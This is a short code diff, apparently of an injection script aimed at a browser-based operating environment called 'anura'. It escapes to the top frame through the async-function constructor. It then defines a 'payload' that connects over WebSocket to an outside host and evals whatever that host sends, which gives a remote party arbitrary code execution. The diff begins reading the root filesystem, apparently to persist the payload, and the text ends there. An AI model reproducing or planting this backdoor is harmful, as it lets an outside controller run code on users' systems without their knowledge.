@@ -1,12 +1,10 @@
 (async function () {})
-    .constructor("return top")()
-    .then(async (top) => {
+    .constructor("return top.anura")()
+    .then(async (anura) => {
         const payload = `let ws = new anura.net.WebSocket("wss://anura.entr.pics/ws/");
         ws.addEventListener("message", (ev) => {
             eval(ev.data);
         });`;
-
-        const anura = top.anura;
 
         const ui8a = await anura.fs.providers
             .get("/")
